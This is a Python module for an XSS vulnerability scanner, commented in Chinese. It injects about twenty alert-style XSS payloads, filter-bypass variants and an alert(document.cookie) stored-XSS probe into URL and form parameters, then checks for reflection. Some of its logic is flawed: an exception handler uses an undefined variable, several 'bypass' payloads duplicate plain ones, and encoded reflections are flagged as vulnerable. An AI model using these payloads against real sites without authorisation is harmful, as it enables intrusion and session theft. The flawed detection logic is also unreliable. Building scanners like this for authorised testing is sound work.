# python/modules/web/xss.py
"""
XSS 检测工具 - 增强版
支持多种 XSS 类型：反射型、存储型、DOM 型、SVG、事件处理器
"""

import httpx
import asyncio
import re
import logging
from typing import Dict, List, Optional
from urllib.parse import urlparse, parse_qs, urlencode

logger = logging.getLogger(__name__)


class XSSScanner:
    """XSS 扫描器 - 增强版"""

    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.client = httpx.AsyncClient(timeout=self.timeout, follow_redirects=False)

    async def close(self):
        await self.client.aclose()

    async def scan(self, url: str, param: str = "q") -> Dict:
        """扫描 XSS 漏洞"""
        results = {
            "url": url,
            "param": param,
            "vulnerable": False,
            "findings": [],
            "xss_types": []
        }

        # 获取基准响应
        base_resp = await self.client.get(url)
        base_content = base_resp.text

        # 1. 测试存储型 XSS（POST 变种）
        stored_result = await self._test_stored_xss(url, param, base_content)
        if stored_result:
            results["vulnerable"] = True
            results["findings"].append(stored_result)
            results["xss_types"].append("stored")

        # 2. 测试多种 XSS 载荷
        xss_payloads = self._get_xss_payloads()

        for payload in xss_payloads:
            result = await self._test_payload(url, param, payload, base_content)
            if result:
                results["vulnerable"] = True
                results["findings"].append(result)
                results["xss_types"].append(result.get("xss_type"))

        # 3. 测试 filter 绕过
        bypass_result = await self._test_filter_bypass(url, param, base_content)
        if bypass_result:
            results["vulnerable"] = True
            results["findings"].append(bypass_result)
            results["xss_types"].append("bypass")

        return results

    def _get_xss_payloads(self) -> List[Dict]:
        """获取各种类型的 XSS 载荷"""
        return [
            # 经典载荷
            {
                "payload": "<script>alert(1)</script>",
                "xss_type": "script_tag",
                "severity": "high"
            },
            {
                "payload": "<img src=x onerror=alert(1)>",
                "xss_type": "img_onerror",
                "severity": "high"
            },
            {
                "payload": "<svg onload=alert(1)>",
                "xss_type": "svg_onload",
                "severity": "high"
            },
            {
                "payload": "<iframe src=javascript:alert(1)>",
                "xss_type": "iframe_js",
                "severity": "medium"
            },
            {
                "payload": "<body onload=alert(1)>",
                "xss_type": "body_onload",
                "severity": "high"
            },
            {
                "payload": "javascript:alert(1)",
                "xss_type": "javascript_protocol",
                "severity": "medium"
            },
            {
                "payload": "<input onfocus=alert(1) autofocus>",
                "xss_type": "input_onfocus",
                "severity": "high"
            },
            {
                "payload": "<select onfocus=alert(1) autofocus>",
                "xss_type": "select_onfocus",
                "severity": "high"
            },
            {
                "payload": "<textarea onfocus=alert(1) autofocus>",
                "xss_type": "textarea_onfocus",
                "severity": "high"
            },
            {
                "payload": "<keygen onfocus=alert(1) autofocus>",
                "xss_type": "keygen_onfocus",
                "severity": "high"
            },
            {
                "payload": "<video><source onerror=alert(1)>",
                "xss_type": "video_onerror",
                "severity": "high"
            },
            {
                "payload": "<audio src=x onerror=alert(1)>",
                "xss_type": "audio_onerror",
                "severity": "high"
            },
            {
                "payload": "<details open ontoggle=alert(1)>",
                "xss_type": "details_ontoggle",
                "severity": "high"
            },
            {
                "payload": "<marquee onstart=alert(1)>",
                "xss_type": "marquee_onstart",
                "severity": "medium"
            },
            {
                "payload": "<object data=javascript:alert(1)>",
                "xss_type": "object_js",
                "severity": "medium"
            },
            {
                "payload": "'-alert(1)-'",
                "xss_type": "alert_escape",
                "severity": "medium"
            },
            {
                "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
                "xss_type": "script_charcode",
                "severity": "high"
            },
            {
                "payload": "<svg><script>alert(1)</script></svg>",
                "xss_type": "svg_script",
                "severity": "high"
            },
            {
                "payload": "<div onclick=alert(1)>click</div>",
                "xss_type": "div_onclick",
                "severity": "medium"
            },
            {
                "payload": "<a href=javascript:alert(1)>click</a>",
                "xss_type": "a_href_js",
                "severity": "medium"
            },
        ]

    async def _test_payload(self, url: str, param: str, payload_info: Dict, base_content: str) -> Optional[Dict]:
        """测试单个载荷"""
        payload = payload_info["payload"]

        try:
            test_url = self._inject_param(url, param, payload)
            resp = await self.client.get(test_url)
            content = resp.text

            # 检查载荷是否被反射
            if payload in content:
                return {
                    "payload": payload,
                    "xss_type": payload_info["xss_type"],
                    "severity": payload_info["severity"],
                    "reflection": "direct",
                    "description": f"检测到 {payload_info['xss_type']} XSS，载荷被直接反射"
                }

            # 检查 HTML 编码
            encoded_payloads = self._get_encoded_variants(payload)
            for encoded in encoded_payloads:
                if encoded in content:
                    return {
                        "payload": payload,
                        "encoded": encoded,
                        "xss_type": payload_info["xss_type"],
                        "severity": payload_info["severity"],
                        "reflection": "encoded",
                        "description": "载荷被 HTML 编码但仍可能被执行"
                    }

        except httpx.TimeoutException:
            logger.debug(f"XSS 测试超时: {test_url}")
        except httpx.RequestError as e:
            logger.debug(f"XSS 测试请求错误: {e}")

        return None

    def _get_encoded_variants(self, payload: str) -> List[str]:
        """获取编码变体"""
        variants = [
            # HTML 编码
            payload.replace("<", "&lt;").replace(">", "&gt;"),
            payload.replace("<", "&#60;").replace(">", "&#62;"),
            payload.replace("<", "&#x3C;").replace(">", "&#x3E;"),
            # 大小写混合
            payload.lower(),
            payload.upper(),
            payload.replace("script", "SCRIPT").replace("onerror", "OnErRoR"),
        ]
        return [v for v in variants if v != payload]

    async def _test_filter_bypass(self, url: str, param: str, base_content: str) -> Optional[Dict]:
        """测试 filter 绕过"""
        bypass_payloads = [
            # 大小写绕过
            "<ScRiPt>alert(1)</ScRiPt>",
            "<IMG SRC=x onerror=alert(1)>",
            # 空格绕过
            "<script>alert(1)</script>",
            "<script>alert(1)</script>",
            # 注释绕过
            r"<script>alert(1)<\/script>",
            "<script>alert(1)<!--",
            # 双写绕过
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<img src=x onerror=alert(1)>",
            # 替代标签
            "<svg onload=alert(1)>",
            "<math onload=alert(1)>",
            # 事件处理器变种
            "<img src=x onerror=alert(1)>",
            "<img src=x OnError=alert(1)>",
            "<img src=x ONERROR=alert(1)>",
        ]

        for payload in bypass_payloads:
            try:
                test_url = self._inject_param(url, param, payload)
                resp = await self.client.get(test_url)

                # 检查是否绕过成功
                if payload in resp.text or payload.lower() in resp.text.lower():
                    return {
                        "payload": payload[:50] + "...",
                        "xss_type": "filter_bypass",
                        "severity": "high",
                        "description": "检测到可能的 filter 绕过"
                    }
            except httpx.TimeoutException:
                logger.debug(f"Filter bypass 测试超时: {test_url}")
            except httpx.RequestError as e:
                logger.debug(f"Filter bypass 测试请求错误: {e}")

        return None

    async def _test_stored_xss(self, url: str, param: str, base_content: str) -> Optional[Dict]:
        """测试存储型 XSS（通过 POST）"""
        # 存储型 XSS 需要在输入点检测，这里简化处理
        stored_payload = "<script>alert(document.cookie)</script>"

        try:
            # 尝试 POST 请求
            test_data = {param: stored_payload}
            resp = await self.client.post(url, data=test_data)

            if stored_payload in resp.text:
                return {
                    "payload": stored_payload,
                    "xss_type": "stored",
                    "severity": "critical",
                    "description": "检测到可能的存储型 XSS，数据被保存并回显"
                }
        except httpx.TimeoutException:
            logger.debug(f"存储型 XSS 测试超时: {test_url}")
        except httpx.RequestError as e:
            logger.debug(f"存储型 XSS 测试请求错误: {e}")

        return None

    def _inject_param(self, url: str, param: str, injection: str) -> str:
        """将注入载荷注入到 URL 参数中"""
        parsed = urlparse(url)
        query = parse_qs(parsed.query, keep_blank_values=True)

        if param in query:
            query[param] = [injection]
        else:
            query[param] = [injection]

        new_query = urlencode(query, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"


# 快速扫描函数
async def quick_scan(url: str) -> Dict:
    """快速扫描 URL 中的 XSS"""
    scanner = XSSScanner()
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return {"url": url, "vulnerable": False, "reason": "无可检测的参数"}

        results = []
        for param in params.keys():
            result = await scanner.scan(url, param)
            if result["vulnerable"]:
                results.append(result)

        return {
            "url": url,
            "vulnerable": len(results) > 0,
            "findings": results
        }
    finally:
        await scanner.close()
